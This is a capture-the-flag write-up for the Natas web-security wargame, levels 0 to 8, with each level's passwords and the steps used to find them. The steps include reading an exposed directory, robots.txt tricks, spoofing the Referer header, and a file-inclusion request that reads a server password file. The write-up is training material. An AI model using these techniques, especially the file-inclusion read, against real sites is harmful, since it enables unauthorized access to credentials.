# Natas


## What we Learned

- the `robots.txt` file tells the search engine crawlers which URLs can be 
  accessed
- If the browser doesn't know where we came from, it's probably because there was a problem in the Referer

### Level 0 

Goal: Inspect the source code to find the flag

```
Username: natas0
Password: natas0
URL:      http://natas0.natas.labs.overthewire.org

<!--The password for natas1 is g9D9cREhslqBKtcA2uocGHPfMZVzeFK6 -->
```

Flag: `g9D9cREhslqBKtcA2uocGHPfMZVzeFK6`


### Level 0 -> Level 1

Goal: Inspect page source even though "right click is blocked" ie try it even 
	though it says it doesn't work

```
Username: natas1
URL:      http://natas1.natas.labs.overthewire.org

<!--The password for natas2 is h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7 -->

```

Flag: `h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7`


### Level 1 -> Level 2

Goal: Check page source to find firectory and files we can access

```
Username: natas2
URL:      http://natas2.natas.labs.overthewire.org

<img src="files/pixel.png">
</div>
</body></html>

>>> http://natas2.natas.labs.overthewire.org/files
<tr><td valign="top"><img src="/icons/text.gif" alt="[TXT]"></td><td><a href="users.txt">users.txt</a></td><td align="right">2022-09-01 06:27  </td><td align="right">145 </td><td>&nbsp;</td></tr>

We click on users.txt to find

# username:password
alice:BYNdCesZqW
bob:jw2ueICLvT
charlie:G5vCxkVV3m
natas3:G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q
eve:zo4mJWyNj2
mallory:9urtcpzBmH
```

Flag: `G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q`


### Level 2 -> Level 3

Goal: Find disallowed URLs in search crawlers inside `robots.txt`

```
Username: natas3
URL:      http://natas3.natas.labs.overthewire.org

>>> http://natas3.natas.labs.overthewire.org/robots.txt
User-agent: *
Disallow: /s3cr3t/

>>> http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt
natas4:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm

```

Flag: `tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm`

%% ------------------------------------------------------------------

### Level 3 -> Level 4

Goal: modify HTTP header `Referer` so that the url knows where we come from. 

[HTTP Referer](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referer)

```
Username: natas4
URL:      http://natas4.natas.labs.overthewire.org

>>> python3 natas4.py
Access granted. The password for natas5 is Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD

```

Flag: `Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD`


%% ------------------------------------------------------------------

### Level 4 -> Level 5

Goal: when we are not logged in, it may not have remembered our session

```
Username: natas5
URL:      http://natas5.natas.labs.overthewire.org

>>> python3 natas5.py
Access granted. The password for natas6 is fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR</div>

```

Flag: `fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR`


%% ------------------------------------------------------------------

### Level 5 -> Level 6

Goal: 

```
Username: natas6
URL:      http://natas6.natas.labs.overthewire.org

1. Inspect source code

<?

include "includes/secret.inc";

    if(array_key_exists("submit", $_POST)) {
        if($secret == $_POST['secret']) {
        print "Access granted. The password for natas7 is <censored>";
    } else {
        print "Wrong secret";
    }
    }
?>

2. go to http://natas6.natas.labs.overthewire.org/includes/secret.inc and inspect source code

<?
$secret = "FOEIUWGHFEEUHOFUOIU";
?>

3. submit secret 
Access granted. The password for natas7 is jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr 

```

Flag: `jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr`


%% ------------------------------------------------------------------

### Level 6 -> Level 7

Goal: 

```
Username: natas7
URL:      http://natas7.natas.labs.overthewire.org

1. Inside source code
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->

2. find password
>>> http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB 

```

Flag: `a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB `


%% ------------------------------------------------------------------

### Level 7 -> Level 8

Goal: 

```
Username: natas8
URL:      http://natas8.natas.labs.overthewire.org

1. inside source code

<?

$encodedSecret = "3d3d516343746d4d6d6c315669563362";

function encodeSecret($secret) {
    return bin2hex(strrev(base64_encode($secret)));
}

if(array_key_exists("submit", $_POST)) {
    if(encodeSecret($_POST['secret']) == $encodedSecret) {
    print "Access granted. The password for natas9 is <censored>";
    } else {
    print "Wrong secret";
    }
}
?>

base64_encode: encode secret using base64
strrev: reverse string
bin2hex: convert ascii string to hexadecimal
hex2bin: xxd -r -p

2. find secret: hex2bin > strrev > base64

>>> echo "3d3d516343746d4d6d6c315669563362" | xxd -r -p | rev | base64 -d
oubWYf2kBq

or 

>>> natas8.php
echo(base64_decode(strrev(hex2bin("3d3d516343746d4d6d6c315669563362" ))));
oubWYf2kBq

3. submit secret
Access granted. The password for natas9 is Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd 

```

Flag: `Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd`


